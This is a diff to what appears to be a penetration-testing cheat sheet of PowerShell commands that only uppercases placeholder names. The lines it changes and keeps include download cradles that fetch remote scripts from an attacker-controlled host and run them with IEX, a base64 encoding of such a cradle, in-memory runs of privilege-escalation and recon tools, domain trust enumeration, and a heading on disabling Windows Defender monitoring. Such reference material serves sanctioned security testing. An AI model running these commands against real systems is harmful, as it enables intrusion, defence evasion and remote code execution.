@@ -4,7 +4,7 @@
 
 ## Download cradle
 ```powershell
-(new-object system.net.webclient).downloadstring('http://<ip>/<script>') | IEX
+(new-object system.net.webclient).downloadstring('http://<IP>/<script>') | IEX
 ```
 
 ## Get file in trash
@@ -19,7 +19,7 @@ Get-Process
 
 ## Get Proxy
 ```powershell
-[System.Net.WebRequest]::DefaultWebProxy.GetProxy('http://<ip>/<url>')
+[System.Net.WebRequest]::DefaultWebProxy.GetProxy('http://<IP>/<URL>')
 ```
 
 ## Get language mode
@@ -85,7 +85,7 @@ Get-ChildItem -Path HKLM:\SOFTWARE\Policies\Microsoft\Windows\SrpV2\Exe
 
 ## Get domain trust
 ```powershell
-Get-DomainTrust -Domain <domain>
+Get-DomainTrust -Domain <DOMAIN>
 ```
 
 ## Get domain SID
@@ -97,14 +97,14 @@ Get-DomainSID -domain <sid>
 https://github.com/dafthack/HostRecon
 
 ```
-(new-object system.net.webclient).downloadstring('http://<lhost>/HostRecon.ps1') | IEX; Invoke-HostRecon
+(new-object system.net.webclient).downloadstring('http://<LHOST>/HostRecon.ps1') | IEX; Invoke-HostRecon
 ```
 
 ## privesccheck
 https://github.com/itm4n/PrivescCheck
 
 ```powershell
-(new-object system.net.webclient).downloadstring('http://<lhost>/PrivescCheck.ps1') | IEX; Invoke-PrivescCheck
+(new-object system.net.webclient).downloadstring('http://<LHOST>/PrivescCheck.ps1') | IEX; Invoke-PrivescCheck
 ```
 
 ## powershell view assemblies
@@ -126,7 +126,7 @@ $proxyAddr=(Get-ItemProperty -Path 'HKU:$start\Software\Microsoft\Windows\Curren
 #plateform/linux #target/local #cat/PRIVESC #cat/PERSIST #cat/RECON #tag/powershell 
 
 ```powershell
-pwsh -Command '$text = '(New-Object System.Net.WebClient).DownloadString(''http://<lhost>/<file>'') | IEX';$bytes = [System.Text.Encoding]::Unicode.GetBytes($text);$EncodedText = [Convert]::ToBase64String($bytes);$EncodedText'
+pwsh -Command '$text = '(New-Object System.Net.WebClient).DownloadString(''http://<LHOST>/<FILE>'') | IEX';$bytes = [System.Text.Encoding]::Unicode.GetBytes($text);$EncodedText = [Convert]::ToBase64String($bytes);$EncodedText'
 ```
 
 ## powershell - disable Real Time Monitoring (Windows Defender)
